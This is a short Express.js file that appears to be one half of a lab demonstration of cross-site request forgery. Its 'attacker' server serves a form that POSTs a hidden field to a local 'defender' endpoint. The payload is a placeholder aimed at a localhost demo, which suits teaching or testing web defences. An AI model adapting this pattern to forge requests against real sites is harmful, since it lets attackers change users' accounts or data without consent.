import express from "express";
import ejs from "ejs";

const app = express();
app.set("view engine", "ejs");
const port = 8080;

app.set("view engine", "pug");

app.get("/", (req, res) => {
  res.send("Root of attacker.");
});

app.get("/startAttack", (req, res) => {
  let html = "";
  html += "<html>";
  html += "<body>";
  html += "<form method='POST' action='http://defender.localhost/mutateState'>";
  html += "<input type='hidden' name='key' value='value' />";
  html += "<input type='submit' value='Submit' />";
  html += "</form>";
  html += "</body>";
  html += "</html>";
  res.send(html);
});

app.listen(port, () => {
  console.log(`Example app listening on http://localhost:${port}`);
});
